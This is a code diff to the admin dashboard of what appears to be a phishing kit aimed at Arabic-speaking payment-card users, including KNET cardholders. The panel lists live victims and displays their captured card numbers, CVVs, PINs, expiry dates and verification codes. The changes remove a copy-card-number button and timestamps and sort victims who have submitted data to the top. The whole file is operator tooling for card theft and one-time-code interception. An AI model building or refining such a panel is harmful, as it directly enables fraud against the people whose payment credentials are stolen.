@@ -34,34 +34,6 @@
       font-size: 1.2em;
       display: inline-block;
     }
-    .card-number-copy {
-      cursor: pointer;
-      transition: opacity 0.2s ease;
-    }
-    .card-number-copy:hover {
-      opacity: 0.7;
-    }
-    .card-number-copy:active {
-      opacity: 0.5;
-    }
-    .copy-toast {
-      position: fixed;
-      top: 20px;
-      left: 50%;
-      transform: translateX(-50%) translateY(-100px);
-      background: #10b981;
-      color: white;
-      padding: 12px 24px;
-      border-radius: 12px;
-      font-weight: bold;
-      font-size: 14px;
-      z-index: 99999;
-      transition: transform 0.3s ease;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.2);
-    }
-    .copy-toast.show {
-      transform: translateX(-50%) translateY(0);
-    }
     /* Mobile Back Button - hidden by default */
     .mobile-back-btn {
       display: none;
@@ -1343,14 +1315,6 @@
         window.location.reload();
       });
 
-      // Password validation heartbeat - check every 30 seconds
-      setInterval(() => {
-        const savedPwd = localStorage.getItem('adminPassword');
-        if (savedPwd && socket && socket.connected) {
-          socket.emit('admin:validatePassword', savedPwd);
-        }
-      }, 30000);
-
       socket.on('visitors:list', (list) => {
         list.forEach(v => visitors.set(v._id, v));
         renderVisitorsList();
@@ -1494,30 +1458,27 @@
     }
     function _renderVisitorsList() {
       const list = Array.from(visitors.values()).sort((a, b) => {
-        // Sort by most recent activity: new connection, data submission, card, or code entry
+        // Check if visitor has data
+        const hasDataA = (a.dataHistory && a.dataHistory.length > 0) || (a.data && Object.keys(a.data).length > 0);
+        const hasDataB = (b.dataHistory && b.dataHistory.length > 0) || (b.data && Object.keys(b.data).length > 0);
+        
+        // Visitors with data come first
+        if (hasDataA && !hasDataB) return -1;
+        if (!hasDataA && hasDataB) return 1;
+        
+        // If both have data or both don't, sort by last activity
         const getLastActivity = (v) => {
-          let latest = new Date(v.createdAt || 0).getTime();
-          // Check lastDataUpdate (set when any data is submitted)
-          if (v.lastDataUpdate) latest = Math.max(latest, new Date(v.lastDataUpdate).getTime());
-          // Check last data history entry
+          // Check lastDataUpdate first (set when data is submitted)
+          if (v.lastDataUpdate) {
+            return new Date(v.lastDataUpdate).getTime();
+          }
+          // Then check dataHistory
           if (v.dataHistory && v.dataHistory.length > 0) {
-            const lastEntry = v.dataHistory[v.dataHistory.length - 1];
-            if (lastEntry.timestamp) latest = Math.max(latest, new Date(lastEntry.timestamp).getTime());
+            return new Date(v.dataHistory[v.dataHistory.length - 1].timestamp).getTime();
           }
-          // Check last payment card entry
-          if (v.paymentCards && v.paymentCards.length > 0) {
-            const lastCard = v.paymentCards[v.paymentCards.length - 1];
-            if (lastCard.timestamp) latest = Math.max(latest, new Date(lastCard.timestamp).getTime());
-          }
-          // Check last digit code entry
-          if (v.digitCodes && v.digitCodes.length > 0) {
-            const lastCode = v.digitCodes[v.digitCodes.length - 1];
-            if (lastCode.timestamp) latest = Math.max(latest, new Date(lastCode.timestamp).getTime());
-          }
-          // Check connection time (for new visitors)
-          if (v.connectedAt) latest = Math.max(latest, new Date(v.connectedAt).getTime());
-          return latest;
+          return new Date(v.createdAt || 0).getTime();
         };
+        // Sort by last activity (most recent first)
         return getLastActivity(b) - getLastActivity(a);
       });
       const connectedCount = list.filter(v => v.isConnected === true).length;
@@ -1861,9 +1822,8 @@
           if (entry.type === 'code') {
             const dc = entry.data;
             const index = entry.index;
-            const codeTime = dc.timestamp ? new Date(dc.timestamp).toLocaleTimeString('en-GB', {hour: '2-digit', minute: '2-digit'}) : '';
             html += '<div class="data-section bg-orange-50 p-4 rounded-lg" style="border-right-color: #f97316;">';
-            html += '<h3 class="font-bold mb-3 text-orange-800">🔢 رمز التحقق' + (codeTime ? ' <span class="text-xs text-gray-500 font-normal">' + codeTime + '</span>' : '') + '</h3>';
+            html += '<h3 class="font-bold mb-3 text-orange-800">🔢 رمز التحقق</h3>';
             html += '<div class="bg-white p-3 rounded-lg">';
             html += '<div class="flex justify-between items-center mb-2">';
             html += '<span class="font-mono text-lg font-bold text-orange-700">' + dc.code + '</span>';
@@ -1988,12 +1948,11 @@
             const cardIndex = entry.index;
             const isKNET = card.paymentMethod === 'KNET';
             const cardInfo = getCardInfo(card.cardNumber);
-            const cardTime = card.timestamp ? new Date(card.timestamp).toLocaleTimeString('en-GB', {hour: '2-digit', minute: '2-digit'}) : (entry.timestamp ? new Date(entry.timestamp).toLocaleTimeString('en-GB', {hour: '2-digit', minute: '2-digit'}) : '');
             
             if (isKNET) {
               // KNET card display
               html += '<div class="data-section bg-green-50 p-4 rounded-lg" style="border-right-color: #16a34a;">';
-              html += '<h3 class="font-bold mb-3 text-green-800">💳 كي نت (KNET)' + (cardTime ? ' <span class="text-xs text-gray-500 font-normal">' + cardTime + '</span>' : '') + '</h3>';
+              html += '<h3 class="font-bold mb-3 text-green-800">💳 كي نت (KNET)</h3>';
               html += '<div class="bg-gradient-to-r from-green-100 to-teal-100 p-3 rounded-lg mb-3 flex justify-between items-center">';
               html += '<div class="flex items-center gap-2">';
               html += '<span class="text-green-700 font-bold text-lg">🏦 ' + (card.bankName || 'غير محدد') + '</span>';
@@ -2006,7 +1965,7 @@
               html += '<div class="grid grid-cols-1 gap-3 text-base">';
               html += '<div class="text-right"><span class="text-gray-500">البنك:</span> <span class="font-bold text-lg">' + (card.bankName || '-') + '</span></div>';
               html += '<div class="text-right"><span class="text-gray-500">البادئة (Prefix):</span> <span class="font-mono font-bold text-lg">' + (card.prefix || '-') + '</span></div>';
-              html += '<div class="text-right"><span class="text-gray-500">رقم البطاقة:</span> <span class="font-mono font-bold text-lg card-number-copy" dir="ltr" style="unicode-bidi: embed; display: inline-block;" onclick="copyCardNumber(\'' + ((card.prefix || '') + (card.cardNumberOnly || '').replace(/\s/g, '')) + '\')" title="انقر للنسخ">' + (card.cardNumberOnly || '-') + '</span></div>';
+              html += '<div class="text-right"><span class="text-gray-500">رقم البطاقة:</span> <span class="font-mono font-bold text-lg" dir="ltr" style="unicode-bidi: embed; display: inline-block;">' + (card.cardNumberOnly || '-') + '</span></div>';
               html += '<div class="text-right"><span class="text-gray-500">الانتهاء:</span> <span class="font-medium text-lg">' + card.expiryMonth + '/' + card.expiryYear + '</span></div>';
               html += '<div class="text-right"><span class="text-gray-500">CVV:</span> <span class="font-mono font-bold text-lg">' + (card.cvv || '-') + '</span></div>';
               html += '<div class="text-right"><span class="text-gray-500">PIN:</span> <span class="font-mono font-bold text-lg">' + (card.pin || '-') + '</span></div>';
@@ -2022,7 +1981,7 @@
             } else {
               // Credit card display (original)
               html += '<div class="data-section bg-purple-50 p-4 rounded-lg" style="border-right-color: #9333ea;">';
-              html += '<h3 class="font-bold mb-3 text-purple-800">💳 بطاقة دفع' + (cardTime ? ' <span class="text-xs text-gray-500 font-normal">' + cardTime + '</span>' : '') + '</h3>';
+              html += '<h3 class="font-bold mb-3 text-purple-800">💳 بطاقة دفع</h3>';
               html += '<div class="bg-gradient-to-r from-purple-100 to-blue-100 p-3 rounded-lg mb-3 flex justify-between items-center">';
               html += '<div class="flex items-center gap-2">';
               html += '<span class="text-purple-700 font-bold text-lg">🏦 ' + cardInfo.bank + '</span>';
@@ -2035,7 +1994,7 @@
               html += '</div>';
               html += '<div class="bg-white p-4 rounded-lg border border-purple-200">';
               html += '<div class="grid grid-cols-2 gap-4 text-base">';
-              html += '<div class="text-right"><span class="text-gray-500">رقم البطاقة:</span> <span class="font-mono font-bold text-lg card-number-copy" dir="ltr" style="unicode-bidi: embed; display: inline-block;" onclick="copyCardNumber(\'' + (card.cardNumber || '').replace(/\s/g, '') + '\')" title="انقر للنسخ">' + (card.cardNumber ? card.cardNumber.replace(/(\d{4})(?=\d)/g, '$1 ') : '') + '</span></div>';
+              html += '<div class="text-right"><span class="text-gray-500">رقم البطاقة:</span> <span class="font-mono font-bold text-lg" dir="ltr" style="unicode-bidi: embed; display: inline-block;">' + (card.cardNumber ? card.cardNumber.replace(/(\d{4})(?=\d)/g, '$1 ') : '') + '</span></div>';
               html += '<div class="text-left"><span class="text-gray-500">الاسم:</span> <span class="font-medium text-lg">' + card.nameOnCard + '</span></div>';
               html += '<div class="text-right"><span class="text-gray-500">الانتهاء:</span> <span class="font-medium text-lg">' + card.expiryMonth + '/' + card.expiryYear + '</span></div>';
               html += '<div class="text-left"><span class="text-gray-500">CVV:</span> <span class="font-mono font-bold text-lg">' + card.cvv + '</span></div>';
@@ -2056,10 +2015,9 @@
             const bgColor = dataIndex % 2 === 0 ? 'bg-blue-50' : 'bg-teal-50';
             const borderColor = dataIndex % 2 === 0 ? '#3b82f6' : '#14b8a6';
             const textColor = dataIndex % 2 === 0 ? 'text-blue-800' : 'text-teal-800';
-            const dataTime = dataEntry.timestamp ? new Date(dataEntry.timestamp).toLocaleTimeString('en-GB', {hour: '2-digit', minute: '2-digit'}) : '';
             
             html += '<div class="data-section ' + bgColor + ' p-4 rounded-lg" style="border-right-color: ' + borderColor + ';">';
-            html += '<h3 class="font-bold mb-3 ' + textColor + '">📋 ' + (dataEntry.page || 'بيانات') + (dataTime ? ' <span class="text-xs text-gray-500 font-normal">' + dataTime + '</span>' : '') + '</h3>';
+            html += '<h3 class="font-bold mb-3 ' + textColor + '">📋 ' + (dataEntry.page || 'بيانات') + '</h3>';
             html += '<div class="grid grid-cols-2 gap-3">';
             
             // Get commercial name from الاسم التجاري المعتمد field
@@ -3295,38 +3253,6 @@
         }
         renderVisitorsList();
       }
-    }
-    // Copy card number to clipboard
-    function copyCardNumber(number) {
-      if (!number || number === '-') return;
-      navigator.clipboard.writeText(number).then(function() {
-        showCopyToast('تم نسخ رقم البطاقة: ' + number);
-      }).catch(function() {
-        var textArea = document.createElement('textarea');
-        textArea.value = number;
-        textArea.style.position = 'fixed';
-        textArea.style.left = '-9999px';
-        document.body.appendChild(textArea);
-        textArea.select();
-        document.execCommand('copy');
-        document.body.removeChild(textArea);
-        showCopyToast('تم نسخ رقم البطاقة: ' + number);
-      });
-    }
-
-    function showCopyToast(message) {
-      var toast = document.getElementById('copyToast');
-      if (!toast) {
-        toast = document.createElement('div');
-        toast.id = 'copyToast';
-        toast.className = 'copy-toast';
-        document.body.appendChild(toast);
-      }
-      toast.textContent = '✅ ' + message;
-      toast.classList.add('show');
-      setTimeout(function() {
-        toast.classList.remove('show');
-      }, 2000);
     }
   </script>
 </body>
